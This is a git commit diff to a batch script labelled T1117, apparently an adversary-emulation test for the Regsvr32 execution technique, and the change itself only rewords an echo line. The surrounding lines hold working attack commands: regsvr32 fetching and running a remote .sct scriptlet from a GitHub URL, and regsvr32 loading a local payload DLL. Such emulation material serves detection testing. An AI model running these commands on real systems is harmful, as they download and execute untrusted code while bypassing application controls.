4d4f7bdb65d69aa5a5542d1dce6e8178adae92ee
rajrakeshdr <raj.rakeshdr@gmail.com>
2023-11-14 14:43:17 +0530

    Update T1117.bat

--- Payloads/T1117/T1117.bat
+++ Payloads/T1117/T1117.bat
@@ -6,7 +6,7 @@ color 0E
 ECHO ===========================================================================
 ECHO Technique: Suspicious Command-line execution using Regsvr32	(T1117)
 ECHO.
-ECHO [+] Use 'REGSVR32.EXE' to download & execute payload
+ECHO [+] Use 'REGSVR32.EXE' to download and execute payload
 ECHO -------------------------------------------------------------------
 regsvr32.exe /u /n /s /i:https://raw.githubusercontent.com/greycel/poc/master/notepad.sct scrobj.dll
 IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe /s %PAYLOAD%T1117\bin\AllTheThingsx86.dll) ELSE ( regsvr32.exe /s %PAYLOAD%T1117\bin\AllTheThingsx86.dll )
